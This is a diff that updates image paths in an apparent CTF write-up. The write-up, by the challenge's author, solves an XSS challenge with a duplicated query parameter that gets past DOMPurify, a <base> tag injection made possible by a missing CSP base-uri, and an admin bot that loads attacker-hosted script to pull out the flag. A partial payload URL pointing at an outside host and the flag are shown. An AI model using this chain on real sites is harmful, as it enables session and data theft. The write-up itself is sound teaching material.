@@ -13,7 +13,7 @@ description: "Bypassing DOMPurify, CSP base-uri, and HttpOnly cookies to steal a
 
 I authored this web challenge for the Securinets-TEKUP Ramadan CTF. This writeup walks through the intended solution.
 
-![Challenge banner](/assets/images/colorful_1.webp)
+![Challenge banner](../assets/images/colorful_1.webp)
 
 A website was given along with an adminbot link and full source code. The setup immediately suggests an XSS challenge.
 
@@ -91,7 +91,7 @@ But if we pass `?note=aa&note=<script>...`, the check runs on `"aa"` (no bracket
 
 This means we can smuggle HTML/JS in the second `note` parameter, completely bypassing the DOMPurify check. 😉
 
-![Array injection bypass](/assets/images/colorful_2.webp)
+![Array injection bypass](../assets/images/colorful_2.webp)
 
 ---
 
@@ -101,7 +101,7 @@ Evaluating the CSP on [csp-evaluator.withgoogle.com](https://csp-evaluator.withg
 
 > **`base-uri` is missing**
 
-![CSP evaluator showing missing base-uri](/assets/images/colorful_3.webp)
+![CSP evaluator showing missing base-uri](../assets/images/colorful_3.webp)
 
 This is critical. Since `color.js` is loaded via a **relative path**, we can inject a `<base>` tag to redirect that request to our own server.
 
@@ -112,7 +112,7 @@ Payload:
 
 Result: the browser now fetches `/public/color.js` from `mywebsite.com` — our server. Confirmed in the network tab:
 
-![Network tab showing color.js fetched from our server](/assets/images/colorful_4.webp)
+![Network tab showing color.js fetched from our server](../assets/images/colorful_4.webp)
 
 ```
 GET http://mywebsite.com/public/color.js
@@ -168,11 +168,11 @@ http://172.25.0.3:3000/notes?note=aa&note=</script><base href=https://457660601c
 
 The adminbot visits the link → executes our `color.js` → fetches `/flag` → registers user `solver` with the flag as `favorite_color` (base64 encoded).
 
-![Adminbot triggered successfully](/assets/images/colorful_5.webp)
+![Adminbot triggered successfully](../assets/images/colorful_5.webp)
 
 We log in as `solver` and read the `favorite_color`:
 
-![Flag revealed in base64](/assets/images/colorful_6.webp)
+![Flag revealed in base64](../assets/images/colorful_6.webp)
 
 ```
 Securinets{__BASE_URI_FOR_THE_W1N}
